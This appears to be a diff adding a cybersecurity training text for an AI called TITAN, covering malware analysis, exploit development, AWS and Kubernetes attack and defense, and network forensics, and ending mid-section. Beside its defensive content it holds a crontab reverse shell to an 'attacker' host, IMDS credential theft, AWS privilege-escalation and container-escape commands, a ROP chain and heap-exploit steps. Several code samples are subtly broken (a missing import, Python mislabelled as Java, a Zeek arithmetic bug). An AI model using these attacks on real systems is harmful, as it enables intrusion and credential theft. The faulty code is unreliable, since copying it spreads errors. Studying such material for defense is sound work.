@@ -1,0 +1,912 @@
+================================================================================
+TITAN AI — EXPANDED PROFESSIONAL TRAINING PACK v2.0
+DEEP DIVE: MALWARE ANALYSIS, REVERSE ENGINEERING, EXPLOIT DEV, CLOUD SECURITY
+================================================================================
+
+================================================================================
+PART 1: MALWARE ANALYSIS — PROFESSIONAL LEVEL
+================================================================================
+
+--- STATIC ANALYSIS WORKFLOW ---
+
+STEP 1: INITIAL TRIAGE (5 minutes)
+Tools and commands:
+  file malware.exe              # File type, architecture
+  strings malware.exe | head -200  # Readable strings
+  md5sum malware.exe; sha256sum malware.exe  # Hashes for VirusTotal
+  exiftool malware.exe          # Metadata, compilation timestamp
+  pestudio malware.exe          # PE header analysis (Windows)
+  pefile in Python:
+    import pefile
+    pe = pefile.PE("malware.exe")
+    print(pe.FILE_HEADER.Machine)       # 0x14C=x86, 0x8664=x64
+    print(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
+    for section in pe.sections:
+        print(section.Name, section.VirtualAddress, section.SizeOfRawData)
+
+Key indicators in strings output:
+  - URLs/IPs: C2 infrastructure
+  - Registry paths: Persistence mechanisms
+  - File paths: Dropped payloads, config files
+  - API names: Capability fingerprinting
+  - Error messages: Often left in by developers
+  - Mutex names: Identify malware family, prevent re-infection
+
+STEP 2: IMPORT TABLE ANALYSIS
+Suspicious DLL imports:
+  WS2_32.dll  → Network communication
+  WININET.dll → HTTP/FTP client
+  ADVAPI32.dll → Registry, cryptography, services
+  CRYPT32.dll → Certificate/crypto operations
+  NTDLL.dll   → Direct Windows internals (syscalls)
+
+High-risk API combinations:
+  VirtualAlloc + WriteProcessMemory + CreateRemoteThread = Process injection
+  CreateFile + ReadFile + CryptEncrypt = Ransomware
+  RegSetValueEx + Run key strings = Registry persistence
+  WSAStartup + socket + connect = Network communication
+  LoadLibrary + GetProcAddress = Dynamic API resolution (evasion)
+
+STEP 3: ENTROPY ANALYSIS
+  import scipy.stats
+  import math
+  def calculate_entropy(data):
+      if not data:
+          return 0
+      counter = Counter(data)
+      length = len(data)
+      probs = [count / length for count in counter.values()]
+      return -sum(p * math.log2(p) for p in probs if p > 0)
+
+Entropy interpretation:
+  < 5.0: Normal code or data
+  5.0-7.0: Compressed or partially encrypted
+  7.0-7.5: Compressed (UPX, zlib)
+  > 7.5: Encrypted or high-entropy packed section
+  = 8.0 (maximum): Perfect encryption (AES-encrypted payload)
+
+If entire file is high entropy:
+  → Packed (try UPX: upx -d malware.exe)
+  → Custom packer: Requires dynamic unpacking
+
+STEP 4: YARA HUNTING ON DISK
+  yara -r custom_rules.yar /suspicious/directory/ --print-strings
+  yara -r rules.yar malware.exe -m  # Print metadata
+  yara malware.exe Ransomware_Generic Cobalt_Strike_Beacon  # Specific rules
+
+--- DYNAMIC ANALYSIS WORKFLOW ---
+
+SANDBOX SETUP (Isolated Windows VM):
+  1. Snapshot clean VM state
+  2. Disable network or route through INetSim (simulated internet)
+  3. Install monitoring tools:
+     - Process Monitor (ProcMon): File, registry, process, network
+     - Wireshark: Network capture
+     - x64dbg: Debugger
+     - PE-sieve: In-memory PE scanning
+  4. Execute malware
+  5. Collect artifacts, revert to snapshot
+
+BEHAVIORAL INDICATORS TO OBSERVE:
+  Files created:    C:\Users\*\AppData\Roaming\ (common staging area)
+                    C:\ProgramData\ (persistence)
+                    C:\Windows\System32\ (masquerading as system files)
+                    C:\Temp\ (staging payloads)
+
+  Registry writes:  HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+                    HKLM\SYSTEM\CurrentControlSet\Services\ (new service)
+                    HKCU\Software\[random GUID] (configuration storage)
+
+  Network traffic:  DNS queries to long/random domain names (DGA)
+                    Regular beaconing intervals (C2)
+                    TLS to non-common ports (443 fine, 4443 suspicious)
+                    Large outbound POST requests (exfiltration)
+
+  Process activity: Spawning cmd.exe or powershell.exe as child
+                    Injecting into explorer.exe, svchost.exe
+                    Accessing LSASS.exe memory
+
+ADVANCED DYNAMIC ANALYSIS — UNPACKING:
+When malware is packed:
+  1. Set breakpoint at OEP (Original Entry Point)
+     - Look for: PUSHAD at start → many operations → POPAD → JMP [register]
+     - The JMP at end = jump to OEP of unpacked code
+  2. When execution reaches OEP, dump process memory
+     PE-sieve: pe-sieve.exe /pid 1234 /dump /report
+     Process Hacker: Right-click → Miscellaneous → Inject DLL (dump plugin)
+  3. Fix PE headers of dumped file (Import Address Table)
+     Scylla: Import Table Reconstruction
+  4. Analyze unpacked binary with static tools
+
+--- CODE ANALYSIS: COMMON MALWARE PATTERNS ---
+
+PATTERN 1: API HASHING (Evasion of import detection)
+Instead of: LoadLibrary("kernel32.dll") + GetProcAddress("VirtualAlloc")
+Malware does:
+  uint32_t hash_api(const char* api_name) {
+      uint32_t hash = 0;
+      while (*api_name) {
+          hash = (hash >> 13) | (hash << 19);  // ROR 13
+          hash += *api_name++;
+      }
+      return hash;
+  }
+  // Walk PEB.Ldr.InMemoryOrderModuleList
+  // For each export, hash name, compare to target hash
+  // Hash of "VirtualAlloc" = 0x97BC257U (varies by algorithm)
+
+Deobfuscation approach:
+  1. Run sample in debugger, break on dynamic API resolution
+  2. Log all resolved functions
+  3. For static analysis: Implement hash function, create lookup table
+
+PATTERN 2: STRING ENCRYPTION (XOR)
+Common implementation:
+  char encrypted[] = { 0x7C, 0x53, 0x45, 0x42, ... };  // "http://" XOR'd
+  char key = 0x15;
+  for (int i = 0; i < sizeof(encrypted); i++) {
+      encrypted[i] ^= key;  // Decrypt in place
+  }
+
+Python decryptor script:
+  encrypted = bytes([0x7C, 0x53, 0x45, 0x42])
+  key = 0x15
+  plaintext = bytes([b ^ key for b in encrypted])
+  print(plaintext.decode('utf-8', errors='replace'))
+
+For multi-byte XOR key:
+  from itertools import cycle
+  key = b"\xDE\xAD\xBE\xEF"
+  plaintext = bytes([b ^ k for b, k in zip(encrypted, cycle(key))])
+
+PATTERN 3: PROCESS HOLLOWING (with assembly walkthrough)
+High-level:
+  1. CreateProcess(..., CREATE_SUSPENDED, ...)   // Create suspended target
+  2. GetThreadContext(hThread, &ctx)             // Get thread context
+  3. ReadProcessMemory(...)                      // Read current base address from PEB
+  4. NtUnmapViewOfSection(...)                   // Hollow out target PE
+  5. VirtualAllocEx(hProcess, imageBase, ...)    // Allocate space for payload
+  6. WriteProcessMemory(hProcess, imageBase, ...) // Write payload
+  7. SetThreadContext(hThread, &ctx)             // Set EIP to payload OEP
+  8. ResumeThread(hThread)                       // Execute payload in target process
+
+x64 specifics: EAX (x86) → RAX (x64) for entry point in context
+PEB offset: ctx.Rdx+16 = pointer to ImageBase in PEB
+
+Detection: Sysmon Event ID 8 (CreateRemoteThread),
+           Event ID 10 with CallTrace containing RWX memory regions
+
+PATTERN 4: SLEEP OBFUSCATION (Avoiding memory scanning)
+Modern technique: Encrypt beacon in memory while sleeping
+  1. Register timer/APC callback
+  2. When sleeping: Encrypt beacon payload in-memory (Ekko, Foliage techniques)
+  3. Re-register callback for wakeup
+  4. On wakeup: Decrypt beacon, execute C2 communication
+  5. Re-encrypt before next sleep
+
+Detection: Look for RWX memory regions that change entropy while process sleeps
+           Use PE-sieve periodic scanning to detect anomalies
+
+--- REVERSE ENGINEERING: ADVANCED TECHNIQUES ---
+
+RECOGNIZING COMPILER CONSTRUCTS:
+Virtual function call (C++):
+  mov rax, [rcx]           ; Load vtable pointer from 'this'
+  call [rax + 0x18]        ; Call virtual function at vtable offset 24
+
+Stack canary check (gcc -fstack-protector):
+  mov rax, [rbp-0x8]       ; Load stored canary
+  xor rax, fs:0x28         ; Compare with TLS stored canary
+  jne error_handler        ; Jump if mismatch (stack smashed)
+
+Optimized loop (unrolled by compiler):
+  xmm0 = load 16 bytes at once
+  pcmpeqb xmm0, xmm1       ; Compare 16 bytes in parallel
+  pmovmskb eax, xmm0        ; Create bitmask from comparison
+  test eax, eax
+
+CRYPTOGRAPHIC CONSTANT IDENTIFICATION:
+AES S-Box start: 0x63, 0x7C, 0x77, 0x7B, 0xF2...
+SHA-256 initialization constants: 0x6A09E667, 0xBB67AE85, 0x3C6EF372...
+MD5 constants: 0xD76AA478, 0xE8C7B756, 0x242070DB...
+RC4 key scheduling: Look for sequential array initialization + swap loop
+
+Use findcrypt3 IDA plugin or CyberChef to identify crypto constants automatically
+
+DECOMPILER USAGE (IDA Pro / Ghidra):
+Import tricks:
+  - Rename variables from var_18 to meaningful names
+  - Retype variables: Right-click → Set type → int* or char[256]
+  - Define structures: Helps decompiler understand field accesses
+  - Add function signatures from headers
+
+Ghidra scripting (Java):
+  def analyze_suspicious_function():
+      fm = currentProgram.getFunctionManager()
+      for func in fm.getFunctions(True):
+          if func.getName().startswith("FUN_"):
+              body = func.getBody()
+              if body.getNumAddresses() > 500:
+                  print(f"Large unnamed function: {func.getEntryPoint()}")
+
+IDA Python script to find decryption loops:
+  import idaapi, idc
+  for ea in Heads(SegStart(SegByName('.text')), SegEnd(SegByName('.text'))):
+      if idc.GetMnem(ea) == 'xor':
+          op1 = idc.GetOpnd(ea, 0)
+          op2 = idc.GetOpnd(ea, 1)
+          if op1 != op2:  # Not xor eax, eax (zero register)
+              print(f"XOR at {hex(ea)}: {op1} ^ {op2}")
+
+================================================================================
+PART 2: EXPLOIT DEVELOPMENT — TECHNICAL DEPTH
+================================================================================
+
+--- MEMORY CORRUPTION FUNDAMENTALS ---
+
+STACK BUFFER OVERFLOW (Classic):
+Vulnerable C code:
+  void vulnerable(char *input) {
+      char buffer[64];
+      strcpy(buffer, input);  // No bounds check
+  }
+
+Stack layout (x86):
+  [buffer (64 bytes)][saved EBP (4 bytes)][saved EIP (4 bytes)][args...]
+  Overflow: Fill buffer + 4 bytes (overwrite EBP) + 4 bytes (overwrite EIP)
+
+Finding offset with pattern:
+  python3 -c "import sys; sys.stdout.buffer.write(b'Aa0Aa1Aa2Aa3Aa4Aa5...')" > input
+  gdb -q ./vuln
+  run < input
+  # EIP value = offset in De Bruijn pattern
+  python3 -c "from pwn import *; print(cyclic_find(0x61413361))"
+
+x64 differences:
+  - RIP control requires overwriting return address at rbp+8
+  - Calling convention: rdi, rsi, rdx, rcx, r8, r9 for first 6 args
+  - Stack must be 16-byte aligned before CALL
+  - ASLR + PIE: Must leak address before ROP
+  - NX/DEP: Can't execute shellcode on stack; use ROP chains
+
+RETURN-ORIENTED PROGRAMMING (ROP):
+Goal: Chain existing code snippets ("gadgets") ending in RET
+Finding gadgets:
+  ROPgadget --binary vuln --rop --badbytes "00"
+  ropper -f vuln --search "pop rdi; ret"
+  pwndbg: rop --binary vuln
+
+Building ROP chain (Linux x64 execve /bin/sh):
+  # Goal: execve("/bin/sh", NULL, NULL)
+  # syscall number 59 = execve
+  # Arguments: rdi=/bin/sh pointer, rsi=0, rdx=0, rax=59
+
+  from pwn import *
+  elf = ELF('./vuln')
+  rop = ROP(elf)
+
+  # Step 1: Write "/bin/sh" to writable memory
+  rop.raw(pop_rdi)           # pop rdi; ret
+  rop.raw(writable_addr)     # address to write "/bin/sh"
+  rop.raw(pop_rax_rdi_rsi)   # gadget to set up write syscall
+
+  # Step 2: Set up execve arguments
+  rop.raw(pop_rdi)
+  rop.raw(binsh_addr)        # pointer to "/bin/sh"
+  rop.raw(pop_rsi)
+  rop.raw(0)                 # NULL (argv)
+  rop.raw(pop_rdx)
+  rop.raw(0)                 # NULL (envp)
+
+  # Step 3: Set rax = 59 and syscall
+  rop.raw(pop_rax)
+  rop.raw(59)
+  rop.raw(syscall_ret)       # syscall; ret
+
+HEAP EXPLOITATION:
+Common vulnerability classes:
+  Use-After-Free: Access freed memory after realloc → type confusion
+  Double-Free: Free same chunk twice → heap metadata corruption
+  Heap Overflow: Write past allocated chunk boundary
+  Uninitialized Heap: Read sensitive data from previously freed memory
+
+ptmalloc internals (glibc malloc):
+  Chunk layout:
+    [prev_size (8 bytes if prev free)][size (8 bytes)][data...][fwd][bk (if free)]
+  Size field flags: PREV_INUSE (0x1), IS_MMAPPED (0x2), NON_MAIN_ARENA (0x4)
+  Bins:
+    Fast bins: 0x20-0xb0, singly linked, no consolidation
+    Unsorted bin: All freed chunks first go here
+    Small bins: 0x20-0x3f0, doubly linked
+    Large bins: > 0x3f0, doubly linked with skip pointers
+
+Tcache exploitation (glibc 2.26+):
+  Per-thread cache, 7 entries per size class
+  Single-linked, no integrity check in early versions
+  tcache poisoning: Overwrite next ptr in freed chunk
+  → next allocation returns fake chunk at attacker-controlled address
+
+Example:
+  # After freeing chunk at 0x555555559260 twice (double-free):
+  # tcache: 0x559260 -> 0x559260 (loop)
+  # Allocate to reach second entry, overwrite next with target (e.g., __free_hook)
+  # Allocate again → returns __free_hook
+  # Write system() to __free_hook
+  # free("/bin/sh") → system("/bin/sh")
+
+--- EXPLOIT MITIGATIONS AND BYPASSES ---
+
+1. STACK CANARIES:
+  Bypass methods:
+    a. Information leak: Read canary via format string, off-by-one
+    b. Brute force (forking servers): Try values, detect crash vs no-crash
+    c. Overwrite with correct value: If we know canary value
+  Format string canary leak:
+    printf("%23$p")  # Print 23rd argument (often canary on stack)
+
+2. ASLR:
+  Bypass methods:
+    a. Information leak: Leak pointer from stack/heap/binary
+    b. Partial overwrite: Only overwrite lower bytes (12 bits not randomized)
+    c. Spray: Fill large memory areas with shellcode (old technique)
+    d. ret2plt: Use PLT entries (fixed offsets from binary base)
+  With PIE disabled: Binary at fixed address; only libraries randomized
+
+3. NX/DEP:
+  Bypass: ROP chains (no code execution on stack needed)
+  ret2libc: Classic technique
+    pop_rdi; ret
+    ["/bin/sh" address in libc]
+    ret (for stack alignment)
+    system() address in libc
+
+4. RELRO (Relocation Read-Only):
+  Partial RELRO: PLT entries still writable (GOT overwrite possible)
+  Full RELRO: GOT entirely read-only at startup
+  Bypass Full RELRO: Target other writable locations (__malloc_hook, __free_hook)
+  In glibc 2.34+: __malloc_hook removed; use tcache/fastbin attacks instead
+
+5. CFI (Control Flow Integrity):
+  Restricts indirect branches to valid targets
+  Coarse-grained CFI: All function pointers must point to function starts
+  Fine-grained: Must match function signature
+  Shadow stack: Hardware-enforced return address protection (Intel CET)
+  Bypass: Find type confusion, use "valid" function with exploitable behavior
+
+================================================================================
+PART 3: CLOUD SECURITY — PROFESSIONAL DEEP DIVE
+================================================================================
+
+--- AWS SECURITY: ATTACK AND DEFENSE ---
+
+AWS ATTACK SURFACE:
+Common misconfiguration patterns:
+  1. Public S3 buckets: s3://company-backup accessible without auth
+  2. Overpermissive IAM roles: EC2 instance with AdministratorAccess
+  3. Exposed metadata service: IMDSv1 accessible from web app (SSRF)
+  4. Public RDS snapshots: Database backup downloadable by anyone
+  5. Lambda environment variables: Secrets stored in plaintext env vars
+  6. Exposed management ports: 22/SSH, 3389/RDP open to 0.0.0.0/0
+  7. CloudTrail disabled: No audit trail of API calls
+
+METADATA SERVICE EXPLOITATION (IMDSv1 vs IMDSv2):
+IMDSv1 (vulnerable):
+  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+  # Returns: role-name
+  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
+  # Returns: AccessKeyId, SecretAccessKey, Token, Expiration
+
+SSRF exploit path:
+  1. Find SSRF vulnerability in web app (e.g., image fetch by URL)
+  2. Supply URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+  3. Receive EC2 instance credentials
+  4. Use credentials with AWS CLI from attacker machine
+  5. Escalate via instance role permissions
+
+IMDSv2 (protected):
+  # Requires PUT request first to get token
+  TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
+    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+  # SSRF via GET cannot add PUT method → IMDSv2 blocks SSRF
+  # Mitigation: Enforce IMDSv2 via instance metadata options
+
+AWS PRIVILEGE ESCALATION PATHS:
+1. iam:CreatePolicyVersion → Create new policy version with *:*
+   # If entity has iam:CreatePolicyVersion on its own policy
+   aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/MyPolicy \
+     --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
+     --set-as-default
+
+2. iam:AttachUserPolicy → Attach AdministratorAccess to self
+   aws iam attach-user-policy --user-name MyUser \
+     --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+3. iam:PassRole + ec2:RunInstances → Spawn EC2 with admin role
+   aws ec2 run-instances --image-id ami-xxx --iam-instance-profile Name=AdminRole
+   # SSH to new instance → has admin role → full AWS access
+
+4. lambda:CreateFunction + iam:PassRole → Run code as privileged role
+   aws lambda create-function --function-name backdoor \
+     --role arn:aws:iam::ACCOUNT:role/AdminRole \
+     --runtime python3.9 \
+     --handler lambda.handler \
+     --zip-file fileb://malicious_lambda.zip
+   aws lambda invoke --function-name backdoor output.json
+
+5. iam:CreateLoginProfile → Set password for IAM user, login to console
+
+TOOLS FOR AWS ATTACK ASSESSMENT:
+  Pacu: AWS exploitation framework (like Metasploit for AWS)
+    pacu> import_keys profile
+    pacu> run iam__enum_permissions
+    pacu> run iam__privesc_scan
+    pacu> run s3__bucket_finder
+
+  ScoutSuite: Multi-cloud security auditing
+    scout suite --provider aws --report-dir ./report
+
+  Prowler: AWS security best practices assessment
+    prowler -g gdpr -M json,csv
+
+  CloudMapper: Visualize AWS attack surface
+    python cloudmapper.py collect --account my-account
+    python cloudmapper.py prepare --account my-account
+    python cloudmapper.py webserver
+
+AWS DEFENSIVE CONFIGURATIONS:
+Security Group hardening:
+  # Block all inbound by default; whitelist required ports
+  aws ec2 create-security-group --group-name strict-web --description "Web only"
+  aws ec2 authorize-security-group-ingress --group-id sg-xxx \
+    --protocol tcp --port 443 --cidr 0.0.0.0/0  # HTTPS only
+
+  # Remove overpermissive rules
+  aws ec2 revoke-security-group-ingress --group-id sg-xxx \
+    --protocol tcp --port 22 --cidr 0.0.0.0/0
+
+GuardDuty detection categories:
+  - Backdoor:EC2/DenialOfService.Dns
+  - CryptoCurrency:EC2/BitcoinTool.B
+  - Recon:IAMUser/MaliciousIPCaller
+  - Trojan:EC2/BlackholeTraffic
+  - UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B
+
+CloudTrail key events to monitor:
+  EventName: "ConsoleLogin" with additionalEventData.MFAUsed = "No"
+  EventName: "CreateUser" or "AttachUserPolicy"
+  EventName: "StopLogging"  (attacker disabling trail)
+  EventName: "DeleteTrail"
+  EventName: "PutBucketPolicy" with public access
+
+--- KUBERNETES SECURITY: ATTACK AND DEFENSE ---
+
+KUBERNETES ATTACK SURFACE:
+Common entry points:
+  1. Exposed API server (port 6443): kubectl with anonymous access
+  2. Dashboard exposed: Kubernetes Dashboard without auth
+  3. etcd exposed (port 2379): Direct key-value store access = full cluster control
+  4. Kubelet API (port 10250): Run arbitrary commands in containers
+  5. Container escape: Privileged containers, host path mounts
+  6. Supply chain: Malicious container images
+
+RBAC MISCONFIGURATIONS:
+Overpermissive RBAC example:
+  kind: ClusterRole
+  rules:
+  - apiGroups: ["*"]
+    resources: ["*"]
+    verbs: ["*"]
+  # "star star star" = cluster admin
+
+Dangerous permissions combinations:
+  create pods + create service accounts → bind to privileged SA → escalate
+  get secrets → read service account tokens → impersonate privileged SA
+  patch clusterroles → give self cluster-admin
+  create pods/exec → RCE in any pod
+
+CONTAINER ESCAPE TECHNIQUES:
+1. Privileged container:
+   # Check if privileged
+   cat /proc/1/status | grep CapEff  # All bits set = privileged
+   # Mount host filesystem
+   mkdir /mnt/host && mount /dev/sda1 /mnt/host
+   # Add backdoor to host
+   echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" \
+     >> /mnt/host/etc/crontab
+
+2. Host PID namespace:
+   # If hostPID: true in pod spec
+   # See all host processes
+   ps aux  # Now shows host PIDs
+   # Attach to host process namespace
+   nsenter -t 1 -m -u -i -n -p -- /bin/bash
+   # Now running in host namespace!
+
+3. Docker socket mounted:
+   # If /var/run/docker.sock mounted in container
+   docker -H unix:///var/run/docker.sock run -it -v /:/host ubuntu chroot /host bash
+
+4. CVE-2022-0185 (Linux kernel heap overflow):
+   # Exploits setxattr syscall from within container
+   # Escapes to root on host via kernel exploit
+
+KUBERNETES HARDENING:
+Pod Security Standards:
+  Restricted policy:
+    spec:
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 1000
+        readOnlyRootFilesystem: true
+        allowPrivilegeEscalation: false
+        capabilities:
+          drop: ["ALL"]
+      hostNetwork: false
+      hostPID: false
+      hostIPC: false
+      volumes:  # Only allow specific volume types
+      - configMap
+      - emptyDir
+      - projected
+      - secret
+      - downwardAPI
+      - persistentVolumeClaim
+
+Network Policy (microsegmentation):
+  apiVersion: networking.k8s.io/v1
+  kind: NetworkPolicy
+  metadata:
+    name: deny-all-ingress
+    namespace: production
+  spec:
+    podSelector: {}  # All pods
+    policyTypes:
+    - Ingress
+    - Egress
+    ingress: []  # Deny all ingress
+    egress:
+    - to:
+      - namespaceSelector:
+          matchLabels:
+            kubernetes.io/metadata.name: kube-system
+      ports:
+      - port: 53  # Allow DNS only
+
+OPA/Gatekeeper policy (prevent privileged containers):
+  apiVersion: templates.gatekeeper.sh/v1beta1
+  kind: ConstraintTemplate
+  metadata:
+    name: k8spspprivilegedcontainer
+  spec:
+    crd:
+      spec:
+        names:
+          kind: K8sPSPPrivilegedContainer
+    targets:
+    - target: admission.k8s.gatekeeper.sh
+      rego: |
+        package k8spspprivilegedcontainer
+        violation[{"msg": msg}] {
+          container := input.review.object.spec.containers[_]
+          container.securityContext.privileged == true
+          msg := sprintf("Privileged container not allowed: %v", [container.name])
+        }
+
+--- DEVSECOPS: SECURITY IN CI/CD PIPELINE ---
+
+SECURITY GATES IN CI/CD:
+Stage 1: Pre-commit (developer machine)
+  - Pre-commit hooks: detect-secrets, tflint, gitleaks
+  gitleaks detect --source . --config .gitleaks.toml
+  detect-secrets scan --baseline .secrets.baseline
+
+Stage 2: Build (CI server)
+  - SAST: Semgrep, SonarQube, CodeQL
+  semgrep --config=auto --json src/ > sast_results.json
+  # Fail build if high/critical issues found
+
+  - Dependency scanning: Snyk, OWASP Dependency-Check, Trivy
+  snyk test --json > deps.json
+  trivy fs --exit-code 1 --severity HIGH,CRITICAL .
+
+Stage 3: Container build
+  - Image scanning: Trivy, Grype, Clair
+  trivy image --exit-code 1 --severity CRITICAL myapp:latest
+  grype myapp:latest
+
+  - Dockerfile linting: Hadolint
+  hadolint Dockerfile
+  # Checks: running as root, ADD vs COPY, apt-get pinning
+
+  - Sign images: Cosign (Sigstore)
+  cosign sign --key cosign.key myregistry/myapp:sha256-abc123
+
+Stage 4: Deploy (Kubernetes admission)
+  - Policy enforcement: OPA/Gatekeeper, Kyverno
+  - Image signature verification: Cosign + admission controller
+  - Secret scanning: Prevent secrets in ConfigMaps
+
+Stage 5: Runtime
+  - RASP: Runtime Application Self-Protection (Sqreen, Contrast)
+  - Falco: Container runtime security
+  falco_rule_example: |
+    - rule: Shell in Container
+      desc: Detect shell spawned in container
+      condition: container and proc.name in (shell_binaries)
+      output: "Shell spawned in container (user=%user.name container=%container.name)"
+      priority: WARNING
+
+SECRETS MANAGEMENT BEST PRACTICES:
+Never do:
+  - Hardcode secrets in source code
+  - Store secrets in environment variables in Dockerfiles
+  - Commit secrets to git (even private repos)
+  - Pass secrets as CLI arguments (visible in ps output)
+
+Always do:
+  - HashiCorp Vault: Dynamic secrets, short TTLs
+    vault write aws/roles/my-role \
+      credential_type=iam_user \
+      policy_document=@policy.json
+    vault read aws/creds/my-role  # Gets temporary AWS credentials
+
+  - AWS Secrets Manager: Automatic rotation
+  - Kubernetes Secrets + RBAC + etcd encryption
+  - External Secrets Operator: Sync from Vault/AWS/GCP to k8s secrets
+
+================================================================================
+PART 4: NETWORK SECURITY — PROFESSIONAL DEPTH
+================================================================================
+
+--- TLS/SSL DEEP TECHNICAL ANALYSIS ---
+
+TLS 1.3 HANDSHAKE (simplified):
+Client                                          Server
+  ClientHello (supported cipher suites,    →
+    key_share: ECDH public key)
+                                            ←  ServerHello (chosen cipher,
+                                                key_share: server ECDH public key)
+                                               {EncryptedExtensions}
+                                               {Certificate}
+                                               {CertificateVerify}
+                                               {Finished}
+  {Certificate} (optional mutual auth)     →
+  {CertificateVerify} (optional)           →
+  {Finished}                               →
+  [Application Data]                       →←  [Application Data]
+
+Key improvements over TLS 1.2:
+  - Removed RSA key exchange (no forward secrecy)
+  - Removed static DH key exchange
+  - Removed CBC cipher suites (BEAST, POODLE, Lucky13 vulnerabilities)
+  - Removed RC4 (biased keystream)
+  - Removed export-grade ciphers (FREAK, Logjam)
+  - 0-RTT resumption: First message encrypted (replay risk)
+  - Encrypted handshake after ServerHello (SNI still visible)
+
+CIPHER SUITE ANALYSIS:
+Secure TLS 1.3 cipher suites:
+  TLS_AES_128_GCM_SHA256
+  TLS_AES_256_GCM_SHA384
+  TLS_CHACHA20_POLY1305_SHA256
+
+Legacy TLS 1.2 (acceptable with proper config):
+  TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256  ✓ (forward secrecy)
+  TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 ✓
+
+Deprecated/insecure:
+  TLS_RSA_WITH_AES_128_CBC_SHA    ✗ (no forward secrecy)
+  TLS_RSA_WITH_3DES_EDE_CBC_SHA   ✗ (Sweet32)
+  SSL_CK_RC4_128_WITH_MD5         ✗ (completely broken)
+
+JA3/JA3S FINGERPRINTING:
+JA3 hash = MD5(TLSVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats)
+Use case: Fingerprint TLS clients regardless of IP
+  - Malware families have distinctive JA3 hashes
+  - Cobalt Strike default: 72a589da586844d7f0818ce684948eea
+  - Mimikatz: a0e9f5d64349fb13191bc781f81f42e1
+
+Suricata JA3 detection:
+  alert tls any any -> any any (
+    msg:"Known Malicious JA3 - Cobalt Strike";
+    tls.ja3_hash;
+    content:"72a589da586844d7f0818ce684948eea";
+    sid:9000001; rev:1;)
+
+CERTIFICATE TRANSPARENCY AND SUBDOMAIN DISCOVERY:
+  # Query CT logs for domain certificates
+  curl "https://crt.sh/?q=%.example.com&output=json" | python3 -m json.tool
+  
+  # Extract unique subdomains
+  curl "https://crt.sh/?q=%.example.com&output=json" | \
+    python3 -c "import json,sys; [print(c['name_value']) for c in json.load(sys.stdin)]" | \
+    sort -u
+
+Applications:
+  - Red team: Discover all assets of target organization
+  - Blue team: Monitor for unauthorized certificates on your domains
+  - Phishing detection: Find lookalike domains (e.g., paypa1.com cert issued)
+
+--- NETWORK FORENSICS: PCAP ANALYSIS ---
+
+TSHARK PROFESSIONAL WORKFLOWS:
+# Extract all DNS queries
+tshark -r capture.pcap -Y "dns.flags.response == 0" \
+  -T fields -e frame.time -e ip.src -e dns.qry.name | sort | uniq -c | sort -rn
+
+# Find all HTTP POST requests with body
+tshark -r capture.pcap -Y "http.request.method == POST" \
+  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri \
+  -e http.file_data | head -50
+
+# Detect large DNS responses (possible tunneling)
+tshark -r capture.pcap -Y "dns.flags.response == 1" \
+  -T fields -e ip.src -e dns.qry.name -e frame.len | \
+  awk '$3 > 200 {print}' | sort -k3 -rn
+
+# Extract TLS certificates
+tshark -r capture.pcap -Y "tls.handshake.type == 11" \
+  -T fields -e ip.src -e ip.dst -e tls.handshake.certificate
+
+# Find potential C2 beaconing
+tshark -r capture.pcap -Y "http.request" \
+  -T fields -e frame.time_epoch -e ip.src -e ip.dst -e http.host | \
+  python3 -c "
+import sys, statistics
+from collections import defaultdict
+intervals = defaultdict(list)
+prev = defaultdict(float)
+for line in sys.stdin:
+    t, src, dst, host = line.strip().split('\t')
+    key = (src, dst, host)
+    if prev[key]:
+        intervals[key].append(float(t) - prev[key])
+    prev[key] = float(t)
+for k, v in intervals.items():
+    if len(v) > 5:
+        cv = statistics.stdev(v) / statistics.mean(v) if statistics.mean(v) > 0 else 999
+        if cv < 0.15:
+            print(f'Beacon: {k}, avg={statistics.mean(v):.1f}s, cv={cv:.3f}')
+"
+
+ZEEK (BRO) FOR NETWORK MONITORING:
+Custom Zeek script for DGA detection:
+  # detect_dga.zeek
+  event dns_request(c: connection, msg: dns_msg, qtype: count, qclass: count) {
+      local query = msg$query;
+      # Calculate entropy of domain label
+      local consonants = 0;
+      local vowels = 0;
+      local label = split_string(query, /\./)[0];
+      for (i in label) {
+          if (label[i] == "a" || label[i] == "e" || label[i] == "i" ||
+              label[i] == "o" || label[i] == "u") {
+              vowels += 1;
+          } else if (label[i] != "-") {
+              consonants += 1;
+          }
+      }
+      # High consonant-to-vowel ratio = DGA indicator
+      local ratio = consonants + 0.0 / (vowels + 1.0);
+      if (|label| > 10 && ratio > 4.0) {
+          NOTICE([$note=DGA_Detection,
+                  $conn=c,
+                  $msg=fmt("Potential DGA: %s (C:V ratio %.1f)", query, ratio)]);
+      }
+  }
+
+================================================================================
+PART 5: PROFESSIONAL REASONING AND ANALYSIS PATTERNS
+================================================================================
+
+--- STRUCTURED ANALYTIC TECHNIQUES (SAT) FOR CYBER ---
+
+1. KEY ASSUMPTIONS CHECK
+Before major security decision, list and test assumptions:
+  Scenario: "We believe attackers exfiltrated customer data"
+
+  Assumption 1: "The attacker had access to the database"
+  Test: Check database access logs for attacker IP/account
+  Challenge: Could they have accessed data via application layer?
+
+  Assumption 2: "The 50GB outbound transfer was data exfiltration"
+  Test: What was in the transfer? Examine proxy logs
+  Challenge: Could be legitimate backup, sync, or CDN traffic
+
+  Assumption 3: "The breach started 3 weeks ago"
+  Test: Look for earliest indicator of compromise
+  Challenge: Attacker may have been dormant for months
+
+  Result: Document which assumptions are supported vs unverified
+  Action: Investigate unsupported assumptions before reaching conclusions
+
+2. COMPETING HYPOTHESES ANALYSIS (ACH)
+For incident with ambiguous cause:
+
